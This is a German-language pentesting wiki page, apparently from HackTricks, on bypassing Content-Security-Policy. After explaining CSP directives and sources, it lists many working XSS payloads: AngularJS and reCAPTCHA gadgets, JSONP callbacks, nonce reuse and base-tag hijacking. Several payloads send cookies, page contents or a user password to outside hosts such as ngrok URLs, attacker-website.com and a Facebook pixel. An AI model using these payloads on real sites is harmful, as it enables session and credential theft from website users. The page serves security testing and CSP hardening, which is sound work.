# Content-Security-Policy (CSP) Umgehung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtigen Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!

## Was ist CSP

Content-Security-Policy (CSP) wird als Browser-Technologie anerkannt, die haupts√§chlich darauf abzielt, **Angriffe wie Cross-Site-Scripting (XSS) abzuschirmen**. Sie funktioniert, indem Pfade und Quellen definiert und detailliert werden, aus denen Ressourcen sicher vom Browser geladen werden k√∂nnen. Diese Ressourcen umfassen eine Vielzahl von Elementen wie Bilder, Frames und JavaScript. Beispielsweise k√∂nnte eine Richtlinie das Laden und Ausf√ºhren von Ressourcen von der gleichen Dom√§ne (self) erlauben, einschlie√ülich Inline-Ressourcen und die Ausf√ºhrung von String-Code durch Funktionen wie `eval`, `setTimeout` oder `setInterval`.

Die Implementierung von CSP erfolgt √ºber **Antwortheader** oder durch das Einbinden von **Meta-Elementen in die HTML-Seite**. Nach dieser Richtlinie setzen Browser diese Bestimmungen proaktiv durch und blockieren sofort alle festgestellten Verst√∂√üe.

* Implementiert √ºber Antwortheader:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Implementiert √ºber Meta-Tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### √úberschriften

CSP kann mithilfe dieser Header durchgesetzt oder √ºberwacht werden:

* `Content-Security-Policy`: Setzt die CSP durch; der Browser blockiert Verst√∂√üe.
* `Content-Security-Policy-Report-Only`: Wird zur √úberwachung verwendet; meldet Verst√∂√üe, ohne sie zu blockieren. Ideal f√ºr Tests in Vorproduktionsumgebungen.

### Definieren von Ressourcen

CSP beschr√§nkt die Urspr√ºnge f√ºr das Laden von aktiven und passiven Inhalten und steuert Aspekte wie die Ausf√ºhrung von Inline-JavaScript und die Verwendung von `eval()`. Ein Beispiel f√ºr eine Richtlinie ist:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktiven

* **script-src**: Erlaubt spezifische Quellen f√ºr JavaScript, einschlie√ülich URLs, Inline-Skripte und Skripte, die durch Ereignisbehandler oder XSLT-Stylesheets ausgel√∂st werden.
* **default-src**: Legt eine Standardrichtlinie f√ºr das Abrufen von Ressourcen fest, wenn spezifische Abrufanweisungen fehlen.
* **child-src**: Legt erlaubte Ressourcen f√ºr Web-Worker und eingebettete Frame-Inhalte fest.
* **connect-src**: Beschr√§nkt URLs, die √ºber Schnittstellen wie fetch, WebSocket, XMLHttpRequest geladen werden k√∂nnen.
* **frame-src**: Beschr√§nkt URLs f√ºr Frames.
* **frame-ancestors**: Legt fest, welche Quellen die aktuelle Seite einbetten k√∂nnen, gilt f√ºr Elemente wie `<frame>`, `<iframe>`, `<object>`, `<embed>` und `<applet>`.
* **img-src**: Definiert erlaubte Quellen f√ºr Bilder.
* **font-src**: Legt g√ºltige Quellen f√ºr √ºber `@font-face` geladene Schriftarten fest.
* **manifest-src**: Definiert erlaubte Quellen von Anwendungsmanifestdateien.
* **media-src**: Definiert erlaubte Quellen f√ºr das Laden von Mediendateien.
* **object-src**: Definiert erlaubte Quellen f√ºr `<object>`, `<embed>` und `<applet>`-Elemente.
* **base-uri**: Legt erlaubte URLs f√ºr das Laden mit `<base>`-Elementen fest.
* **form-action**: Listet g√ºltige Endpunkte f√ºr Formular√ºbermittlungen auf.
* **plugin-types**: Beschr√§nkt die MIME-Typen, die eine Seite aufrufen darf.
* **upgrade-insecure-requests**: Weist Browser an, HTTP-URLs in HTTPS umzuschreiben.
* **sandbox**: Wendet Einschr√§nkungen √§hnlich wie das sandbox-Attribut eines `<iframe>` an.
* **report-to**: Legt eine Gruppe fest, an die ein Bericht gesendet wird, wenn die Richtlinie verletzt wird.
* **worker-src**: Legt g√ºltige Quellen f√ºr Worker-, SharedWorker- oder ServiceWorker-Skripte fest.
* **prefetch-src**: Legt g√ºltige Quellen f√ºr Ressourcen fest, die abgerufen oder vorabgerufen werden.
* **navigate-to**: Beschr√§nkt die URLs, zu denen ein Dokument auf beliebige Weise navigieren kann (a, form, window.location, window.open usw.).

### Quellen

* `*`: Erlaubt alle URLs au√üer denen mit den Schemas `data:`, `blob:`, `filesystem:`.
* `'self'`: Erlaubt das Laden von der gleichen Domain.
* `'data'`: Erlaubt das Laden von Ressourcen √ºber das Daten-Schema (z. B. Base64-codierte Bilder).
* `'none'`: Blockiert das Laden von jeder Quelle.
* `'unsafe-eval'`: Erlaubt die Verwendung von `eval()` und √§hnlichen Methoden, aus Sicherheitsgr√ºnden nicht empfohlen.
* `'unsafe-hashes'`: Erm√∂glicht spezifische Inline-Ereignishandler.
* `'unsafe-inline'`: Erlaubt die Verwendung von Inline-Ressourcen wie Inline-`<script>` oder `<style>`, aus Sicherheitsgr√ºnden nicht empfohlen.
* `'nonce'`: Eine Whitelist f√ºr spezifische Inline-Skripte unter Verwendung eines kryptografischen Nonce (einmal verwendete Nummer).
* Wenn die JS-Ausf√ºhrung eingeschr√§nkt ist, ist es m√∂glich, einen verwendeten Nonce innerhalb der Seite mit `doc.defaultView.top.document.querySelector("[nonce]")` zu erhalten und ihn dann wiederzuverwenden, um ein b√∂sartiges Skript zu laden (wenn strict-dynamic verwendet wird, kann jede erlaubte Quelle neue Quellen laden, daher ist dies nicht erforderlich), wie in:

<details>

<summary>Skript unter Verwendung von Nonce erneut laden</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Whitelists Skripte mit einem spezifischen sha256-Hash.
* `'strict-dynamic'`: Erm√∂glicht das Laden von Skripten aus jeder Quelle, wenn sie von einem Nonce oder Hash freigegeben wurden.
* `'host'`: Gibt einen spezifischen Host an, wie z. B. `example.com`.
* `https:`: Beschr√§nkt URLs auf die Verwendung von HTTPS.
* `blob:`: Erm√∂glicht das Laden von Ressourcen aus Blob-URLs (z. B. Blob-URLs, die √ºber JavaScript erstellt wurden).
* `filesystem:`: Erm√∂glicht das Laden von Ressourcen aus dem Dateisystem.
* `'report-sample'`: Enth√§lt eine Probe des verletzenden Codes im Versto√übericht (n√ºtzlich f√ºr die Fehlersuche).
* `'strict-origin'`: √Ñhnlich wie 'self', stellt jedoch sicher, dass das Sicherheitsniveau des Protokolls der Quellen mit dem Dokument √ºbereinstimmt (nur sichere Urspr√ºnge k√∂nnen Ressourcen von sicheren Urspr√ºngen laden).
* `'strict-origin-when-cross-origin'`: Sendet vollst√§ndige URLs bei der Durchf√ºhrung von Anfragen mit demselben Ursprung, sendet jedoch nur den Ursprung, wenn die Anfrage kreuzurspr√ºnglich ist.
* `'unsafe-allow-redirects'`: Erm√∂glicht das Laden von Ressourcen, die sofort zu einer anderen Ressource umgeleitet werden. Nicht empfohlen, da dies die Sicherheit beeintr√§chtigt.

## Unsichere CSP-Regeln

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Arbeitslast: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' √ºber Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Dies funktioniert nicht, f√ºr weitere Informationen [**√ºberpr√ºfen Sie dies**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Arbeitslast:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Wenn Sie auf irgendeine Weise **zul√§ssigen JS-Code erstellen k√∂nnen, der ein neues Skript-Tag** im DOM mit Ihrem JS-Code erstellt, wird das **neue Skript-Tag aufgrund des zul√§ssigen Skripts ausgef√ºhrt**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Arbeitslast:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Fehlen von object-src und default-src

{% hint style="danger" %}
**Es scheint, dass dies nicht mehr funktioniert**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Funktionierende Payloads:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Datei-Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Wenn Sie eine JS-Datei hochladen k√∂nnen, k√∂nnen Sie dieses CSP umgehen:

Arbeitslast:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Jedoch ist es sehr wahrscheinlich, dass der Server die hochgeladene Datei **validiert** und nur das Hochladen eines **bestimmten Dateityps** zul√§sst.

Dar√ºber hinaus, selbst wenn Sie einen **JS-Code innerhalb** einer Datei hochladen k√∂nnten, die von dem Server akzeptiert wird (z. B. _script.png_), reicht dies nicht aus, da einige Server wie der Apache-Server den **MIME-Typ der Datei basierend auf der Erweiterung ausw√§hlen** und Browser wie Chrome die Ausf√ºhrung von Javascript-Code in etwas ablehnen werden, das ein Bild sein sollte. "Gl√ºcklicherweise" gibt es Fehler. Zum Beispiel habe ich aus einem CTF gelernt, dass **Apache die** Erweiterung _**.wave**_ nicht kennt und daher keinen **MIME-Typ wie audio/\*** bereitstellt.

Von hier aus, wenn Sie ein XSS und einen Dateiupload finden und es Ihnen gelingt, eine **falsch interpretierte Erweiterung** zu finden, k√∂nnten Sie versuchen, eine Datei mit dieser Erweiterung und dem Inhalt des Skripts hochzuladen. Oder, wenn der Server das richtige Format der hochgeladenen Datei √ºberpr√ºft, erstellen Sie ein Polyglott ([einige Polyglott-Beispiele hier](https://github.com/Polydet/polyglot-database)).

### Formularaktion

Wenn es nicht m√∂glich ist, JS einzuf√ºgen, k√∂nnten Sie dennoch versuchen, beispielsweise Anmeldeinformationen zu exfiltrieren, indem Sie eine **Formularaktion einf√ºgen** (und m√∂glicherweise darauf hoffen, dass Passwort-Manager Passw√∂rter automatisch ausf√ºllen). Sie finden ein [**Beispiel in diesem Bericht**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Beachten Sie auch, dass `default-src` keine Formularaktionen abdeckt.

### Endpunkte von Drittanbietern + ('unsafe-eval')

{% hint style="warning" %}
F√ºr einige der folgenden Payloads ist **`unsafe-eval` nicht einmal erforderlich**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Laden Sie eine verwundbare Version von Angular und f√ºhren Sie beliebigen JS-Code aus:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads mit Angular + einer Bibliothek mit Funktionen, die das `window`-Objekt zur√ºckgeben ([siehe diesen Beitrag](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Der Beitrag zeigt, dass Sie alle Bibliotheken von `cdn.cloudflare.com` (oder einem anderen erlaubten JS-Bibliotheks-Repository) **laden** k√∂nnten, alle hinzugef√ºgten Funktionen aus jeder Bibliothek ausf√ºhren und √ºberpr√ºfen k√∂nnten, **welche Funktionen aus welchen Bibliotheken das `window`-Objekt zur√ºckgeben**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS aus einem Klassennamen:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Ausnutzung des Google reCAPTCHA-JS-Codes

Laut [**diesem CTF-Writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) k√∂nnen Sie [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) innerhalb einer CSP missbrauchen, um beliebigen JS-Code auszuf√ºhren und die CSP zu umgehen:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Weitere [**Payloads aus diesem Artikel**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Ausnutzung von www.google.com f√ºr offene Weiterleitungen

Die folgende URL leitet auf example.com weiter (von [hier](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
### Drittanbieter-Endpunkte + JSONP

Die M√∂glichkeit besteht, Google Apps Script zu missbrauchen, um Informationen auf einer Seite innerhalb von script.google.com zu empfangen. Wie es in diesem Bericht [getan wird](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Szenarien wie dieses, bei denen `script-src` auf `self` und eine bestimmte Domain gesetzt ist, die auf der Whitelist steht, k√∂nnen mithilfe von JSONP umgangen werden. JSONP-Endpunkte erm√∂glichen unsichere R√ºckrufmethoden, die es einem Angreifer erm√∂glichen, XSS auszuf√ºhren. Funktionierendes Payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **enth√§lt fertige JSONP-Endpunkte zum Umgehen der CSP verschiedener Websites.**

Die gleiche Schwachstelle tritt auf, wenn der **vertrauensw√ºrdige Endpunkt eine offene Weiterleitung enth√§lt**, da Weiterleitungen vertrauensw√ºrdig sind, wenn der urspr√ºngliche Endpunkt vertrauensw√ºrdig ist.

### Missbr√§uche durch Dritte

Wie in dem [folgenden Beitrag](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) beschrieben, gibt es viele Drittanbieter-Domains, die m√∂glicherweise irgendwo in der CSP zugelassen sind und missbraucht werden k√∂nnen, um Daten auszuleiten oder JavaScript-Code auszuf√ºhren. Einige dieser Drittanbieter sind:

| Entit√§t            | Zugelassene Domain                           | F√§higkeiten |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Wenn Sie eine der zugelassenen Domains in der CSP Ihres Ziels finden, besteht die M√∂glichkeit, dass Sie die CSP umgehen k√∂nnen, indem Sie sich bei dem Drittanbieterdienst registrieren und entweder Daten an diesen Dienst ausleiten oder Code ausf√ºhren.

Wenn Sie beispielsweise die folgende CSP finden:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
oder
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Sie sollten in der Lage sein, Daten zu exfiltrieren, √§hnlich wie es immer mit [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) gemacht wurde. In diesem Fall befolgen Sie diese allgemeinen Schritte:

1. Erstellen Sie hier ein Facebook Developer-Konto.
2. Erstellen Sie eine neue "Facebook Login"-App und w√§hlen Sie "Website".
3. Gehen Sie zu "Einstellungen -> Grundlegendes" und notieren Sie sich Ihre "App-ID".
4. Auf der Zielseite, von der Sie Daten exfiltrieren m√∂chten, k√∂nnen Sie Daten direkt mithilfe des Facebook SDK-Gadgets "fbq" √ºber ein "customEvent" und die Datenpayload exfiltrieren.
5. Gehen Sie zu Ihrem App "Event Manager" und w√§hlen Sie die von Ihnen erstellte Anwendung aus (beachten Sie, dass der Event Manager unter einer URL wie dieser zu finden sein k√∂nnte: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. W√§hlen Sie den Tab "Test Events", um die von "Ihrer" Website gesendeten Ereignisse zu sehen.

Dann f√ºhren Sie auf der Opferseite den folgenden Code aus, um das Facebook-Tracking-Pixel zu initialisieren, um auf das Facebook-Entwicklerkonto des Angreifers zu verweisen und ein benutzerdefiniertes Ereignis wie folgt auszul√∂sen:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
### Umgehung √ºber RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Neben der bereits erw√§hnten Umleitung zur Umgehung von Pfadbeschr√§nkungen gibt es eine weitere Technik namens Relative Path Overwrite (RPO), die auf einigen Servern verwendet werden kann.

Wenn beispielsweise CSP den Pfad `https://example.com/scripts/react/` zul√§sst, kann er wie folgt umgangen werden:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Der Browser wird letztendlich `https://example.com/scripts/angular/angular.js` laden.

Dies funktioniert, weil der Browser eine Datei namens `..%2fangular%2fangular.js` unter `https://example.com/scripts/react/` l√§dt, was mit CSP konform ist.

Daher wird es dekodiert und effektiv `https://example.com/scripts/react/../angular/angular.js` angefordert, was √§quivalent zu `https://example.com/scripts/angular/angular.js` ist.

Durch **Ausnutzen dieser Inkonsistenz in der URL-Interpretation zwischen Browser und Server k√∂nnen die Pfadregeln umgangen werden**.

Die L√∂sung besteht darin, `%2f` auf der Serverseite nicht als `/` zu behandeln, um eine konsistente Interpretation zwischen Browser und Server sicherzustellen und dieses Problem zu vermeiden.

Online-Beispiel: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes-JS-Ausf√ºhrung

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### fehlendes **base-uri**

Wenn die Direktive **base-uri** fehlt, k√∂nnen Sie sie missbrauchen, um eine [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) durchzuf√ºhren.

Dar√ºber hinaus, wenn die Seite ein Skript unter Verwendung eines relativen Pfads l√§dt (wie `<script src="/js/app.js">`) und ein **Nonce** verwendet, k√∂nnen Sie das **base** **tag** missbrauchen, um das Skript von **Ihrem eigenen Server zu laden und so ein XSS zu erreichen.**\
Wenn die verwundbare Seite mit **httpS** geladen wird, verwenden Sie eine httpS-URL im base-tag.
```html
<base href="https://www.attacker.com/">
```
### AngularJS Ereignisse

Eine spezifische Richtlinie namens Content Security Policy (CSP) kann JavaScript-Ereignisse einschr√§nken. Dennoch f√ºhrt AngularJS benutzerdefinierte Ereignisse als Alternative ein. Innerhalb eines Ereignisses stellt AngularJS ein einzigartiges Objekt `$event` bereit, das auf das native Browser-Ereignisobjekt verweist. Dieses `$event`-Objekt kann ausgenutzt werden, um die CSP zu umgehen. Insbesondere besitzt in Chrome das `$event/event`-Objekt ein Attribut `path`, das ein Objektarray enth√§lt, das in der Ereignisausf√ºhrungskette verwickelt ist, wobei das `window`-Objekt immer am Ende positioniert ist. Diese Struktur ist entscheidend f√ºr Sandbox-Escape-Taktiken.

Durch das Weiterleiten dieses Arrays an den `orderBy`-Filter ist es m√∂glich, dar√ºber zu iterieren und das Terminalobjekt (das `window`-Objekt) zu nutzen, um eine globale Funktion wie `alert()` auszul√∂sen. Der nachfolgende dargestellte Codeausschnitt verdeutlicht diesen Prozess:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Dieser Ausschnitt hebt die Verwendung der `ng-focus`-Direktive zur Ausl√∂sung des Ereignisses hervor, wobei `$event.path|orderBy` verwendet wird, um das `path`-Array zu manipulieren, und das `window`-Objekt genutzt wird, um die `alert()`-Funktion auszuf√ºhren und somit `document.cookie` offenzulegen.

**Finden Sie weitere Angular-Bypasses unter** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS und whitelistete Dom√§ne
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Eine CSP-Richtlinie, die Domains f√ºr das Laden von Skripten in einer Angular JS-Anwendung whitelistet, kann durch die Aufruf von R√ºckruffunktionen und bestimmten anf√§lligen Klassen umgangen werden. Weitere Informationen zu dieser Technik finden Sie in einem ausf√ºhrlichen Leitfaden, der in diesem [Git-Repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) verf√ºgbar ist.

Funktionierende Payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
### Umgehung durch Weiterleitung

Was passiert, wenn CSP serverseitige Weiterleitung feststellt? Wenn die Weiterleitung zu einem anderen Ursprung f√ºhrt, der nicht erlaubt ist, schl√§gt sie fehl.

Gem√§√ü der Beschreibung in [CSP-Spezifikation 4.2.2.3. Pfade und Weiterleitungen](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) kann die Weiterleitung jedoch die urspr√ºnglichen Beschr√§nkungen umgehen, wenn sie zu einem anderen Pfad f√ºhrt.

Hier ist ein Beispiel:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Wenn CSP auf `https://www.google.com/a/b/c/d` festgelegt ist, werden sowohl Skripte `/test` als auch `/a/test` durch CSP blockiert.

Jedoch wird das endg√ºltige `http://localhost:5555/301` **auf der Serverseite zu `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` umgeleitet**. Da es sich um eine Umleitung handelt, wird der **Pfad nicht ber√ºcksichtigt** und das **Skript geladen**, wodurch die Pfadbeschr√§nkung umgangen wird.

Durch diese Umleitung wird selbst bei vollst√§ndiger Angabe des Pfads die Sicherheitsma√ünahme umgangen.

Daher ist die beste L√∂sung sicherzustellen, dass die Website keine offenen Umleitungsanf√§lligkeiten aufweist und dass es keine Domains gibt, die in den CSP-Regeln ausgenutzt werden k√∂nnen.

### Umgehung von CSP mit h√§ngender Markup

Lesen Sie [hier, wie es geht](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` bedeutet, dass du beliebigen Code innerhalb des Codes ausf√ºhren kannst (XSS kann Code ausf√ºhren) und `img-src *` bedeutet, dass du auf der Webseite jedes Bild aus jeder Quelle verwenden kannst.

Du kannst diese CSP umgehen, indem du die Daten √ºber Bilder exfiltrierst (in diesem Fall nutzt das XSS einen CSRF aus, bei dem eine vom Bot zug√§ngliche Seite ein SQLi enth√§lt und die Flagge √ºber ein Bild extrahiert):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Von: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

